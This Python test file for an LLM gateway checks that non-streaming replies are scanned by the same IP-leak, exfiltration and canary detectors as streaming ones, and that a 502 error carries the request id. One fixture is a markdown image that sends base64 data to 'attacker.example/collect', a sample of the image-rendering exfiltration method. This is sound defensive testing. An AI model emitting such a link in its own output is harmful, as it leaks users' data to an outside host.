"""GW33 output parity on the NON-streaming path (integration live finding, 4 Nov 2026).

Live on the booted dev stack, a ``stream=false`` reply carrying an RFC1918 address, a data-bearing
markdown image or the echoed canary came back HTTP 200 ``allow`` while the same reply with
``stream=true`` was withheld by ``out_ip_leak`` / ``out_exfil`` / ``out_canary``: the non-streaming
``_enforce_channels`` scanned with the GW09 scanner only. These tests pin that the non-streaming
scanner now includes the plan's built-in GW33 detectors, and is unchanged for a plan without them.
"""

from __future__ import annotations

from dataclasses import dataclass
from types import SimpleNamespace
from typing import cast

from gateway_v2.domain import Action, Category, StreamingMode
from gateway_v2.edge.openai_nonstream import _whole_response_scanner
from gateway_v2.edge.request_holds import RequestHolds
from gateway_v2.edge.routes import ChatRoute
from tests.e2e.gw33_support import contract, plan_of, rule


@dataclass(frozen=True)
class _Ticket:
    token: str

    def reveal(self) -> str:
        return self.token


def _deps() -> ChatRoute:
    def scanner(_text: str) -> tuple[()]:
        return ()

    return cast("ChatRoute", SimpleNamespace(error_scanner=scanner, contract=contract()))


def test_ip_leak_is_scanned_on_the_non_streaming_path_in_both_plan_modes() -> None:
    ip = rule("out_ip_leak", Category.IP_LEAK, Action.BLOCK, "output.ip_leak")
    for mode in (StreamingMode.INCREMENTAL, StreamingMode.STRICT_WITHHOLD):
        scan = _whole_response_scanner(_deps(), plan_of(mode, ip), RequestHolds())
        assert Category.IP_LEAK in {f.category for f in scan("db is at 10.20.30.40")}


def test_exfil_image_is_scanned_on_the_non_streaming_path() -> None:
    ex = rule("out_exfil", Category.EXFIL, Action.BLOCK, "output.exfil")
    scan = _whole_response_scanner(
        _deps(), plan_of(StreamingMode.STRICT_WITHHOLD, ex), RequestHolds()
    )
    text = "![x](https://attacker.example/collect?d=c2VjcmV0LWRhdGEtaGVyZQ==)"
    assert Category.EXFIL in {f.category for f in scan(text)}


def test_the_request_canary_is_found_on_the_non_streaming_path() -> None:
    canary = rule("out_canary", Category.CANARY, Action.BLOCK, "output.canary")
    holds = RequestHolds()
    token = "cnry_abcdefghijklmnopqrstuvwxyz"
    holds.note_canary(_Ticket(token))
    scan = _whole_response_scanner(_deps(), plan_of(StreamingMode.INCREMENTAL, canary), holds)
    assert Category.CANARY in {f.category for f in scan(f"echo: hi\nInternal reference {token}.")}


def test_a_plan_without_built_in_output_rules_keeps_the_base_scanner_only() -> None:
    pii = rule("r", Category.PII, Action.REDACT)
    scan = _whole_response_scanner(_deps(), plan_of(StreamingMode.INCREMENTAL, pii), RequestHolds())
    assert list(scan("db is at 10.20.30.40")) == []


def test_no_plan_keeps_the_base_scanner_only() -> None:
    assert list(_whole_response_scanner(_deps(), None, None)("10.20.30.40")) == []


def test_a_non_streaming_post_dispatch_refusal_echoes_the_request_id() -> None:
    """Live finding: a non-streaming upstream 502 rendered ``error.request_id: null`` and no
    ``x-request-id`` header while the streaming 502 carried both."""
    import asyncio
    import json

    from gateway_v2.edge.openai_nonstream import EnforcedOutput, emit_enforced_chat

    holds = RequestHolds()
    holds.note_request("zs-org-abc")
    sent: list[dict[str, object]] = []

    async def send(message: dict[str, object]) -> None:
        sent.append(message)

    plan = plan_of(StreamingMode.INCREMENTAL)
    enforced = EnforcedOutput(deltas=(), refuse_code="upstream_error")
    asyncio.run(emit_enforced_chat(send, _deps(), None, plan, enforced, holds))  # type: ignore[arg-type]
    start = next(m for m in sent if m["type"] == "http.response.start")
    headers = {k.decode(): v.decode() for k, v in start["headers"]}  # type: ignore[union-attr]
    chunks = [m.get("body", b"") for m in sent if m["type"] == "http.response.body"]
    body = json.loads(b"".join(chunks))  # type: ignore[arg-type]
    assert headers.get("x-request-id") == "zs-org-abc"
    assert body["error"]["request_id"] == "zs-org-abc"
